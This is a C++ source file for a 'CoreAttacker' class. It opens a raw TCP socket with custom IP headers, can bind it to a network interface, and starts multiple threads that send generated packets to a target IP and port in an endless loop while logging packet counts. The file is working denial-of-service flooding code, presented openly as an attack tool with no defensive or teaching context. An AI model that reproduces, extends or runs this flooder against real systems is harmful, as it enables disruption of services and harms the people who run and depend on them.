#include "attacker.hpp"
#include "packet.hpp"          
#include <iostream>           
#include <sys/socket.h>       
#include <netinet/in.h>       
#include <netinet/ip.h>        
#include <arpa/inet.h>         
#include <unistd.h>            
#include <stdexcept>
#include <thread>
#include <cstring>
#include <cerrno>
#include <net/if.h>
#include <vector>
#include <mutex>


CoreAttacker::CoreAttacker(const TargetInfo& target, int threads_count)
    : target_(target), threads_count_(threads_count), interface_name_(target.interface)
{

  this->raw_socket_fd_ = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (this->raw_socket_fd_ < 0) {
        throw std::runtime_error(std::string("Failed to create raw socket. Try running with 'sudo'. Error: ") + strerror(errno));
    }

    int one = 1;
    if (setsockopt(this->raw_socket_fd_, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        throw std::runtime_error(std::string("Failed to set IP_HDRINCL. Error: ") + strerror(errno));
    }

    if (!interface_name_.empty()) {
        bind_to_interface(this->raw_socket_fd_, interface_name_);
    }
}

void CoreAttacker::start_flood() {
    std::vector<std::thread> workers;

    for (int i = 0; i < this->threads_count_; ++i) { 
        workers.emplace_back(&CoreAttacker::attack_thread_loop, this);
    }
    
    join_threads(workers);
}

void CoreAttacker::attack_thread_loop() {
    PacketGenerator generator(target_);
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_.port);
    target_addr.sin_addr.s_addr = inet_addr(target_.ip.c_str());
    
    while (true) {
        std::vector<char> raw_packet = generator.get_raw_packet();
        
        ssize_t sent_bytes = sendto(
            this->raw_socket_fd_,                   
            raw_packet.data(),                      
            raw_packet.size(),                      
            0,                                      
            (struct sockaddr*)&target_addr,         
            sizeof(target_addr)                     
        );

        if (sent_bytes < 0) {
            std::cerr << "Thread error sending packet!" << std::endl;
        } else {
            long long current_count = ++packet_count_;

            if (current_count % 10000 == 0) {
                std::lock_guard<std::mutex> lock(log_mutex_);
                
                std::cout << "[LOG] Sent: " << current_count
                          << " | Target: " << target_.ip 
                          << ":" << target_.port
                          << " | Threads: " << threads_count_
                          << " | Interface: " << (interface_name_.empty() ? "DEFAULT" : interface_name_)
                          << std::endl;
            }
        }
    }
}

void CoreAttacker::join_threads(std::vector<std::thread>& threads) {
    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }
}

void CoreAttacker::bind_to_interface(int socket_fd, const std::string& interface_name) {

    if (interface_name.length() >= IFNAMSIZ) {
        throw std::runtime_error("Interface name is too long or invalid.");
    }

    if (setsockopt(socket_fd, SOL_SOCKET, SO_BINDTODEVICE,
                   interface_name.c_str(), interface_name.length() + 1) < 0) {

        std::string err = "Failed to bind socket to interface " + interface_name +
                          ". Error: " + strerror(errno);

        throw std::runtime_error(err);
    }
    
    std::cout << "[INFO] Successfully bound socket to interface: " << interface_name << std::endl;
}
